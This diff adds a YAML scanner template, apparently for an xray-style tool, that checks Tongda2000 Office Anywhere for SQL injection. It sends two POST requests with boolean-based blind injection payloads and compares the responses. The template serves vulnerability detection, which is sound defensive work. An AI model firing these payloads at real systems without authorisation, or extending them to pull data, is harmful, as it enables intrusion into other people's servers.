@@ -1,0 +1,31 @@
+name: yaml-poc-tongda2000-office_anywhere-sql_injection-CT-530454
+binding: 1b4f7cd5-b471-446b-97bb-78952f6b7c99
+detail:
+    author: guichen.guo
+    vulnerability:
+        id: a226ce50-bff4-4ea1-859b-f418d802fb18
+        level: high
+    warning: Harmless
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /general/document/index.php/recv/register/insert
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+            follow_redirects: false
+        expression: response.status == 302
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /general/document/index.php/recv/register/insert
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
+            follow_redirects: false
+        expression: response.status == 500 && response.body.bcontains(b"SQL")
+expression: r0() && r1()
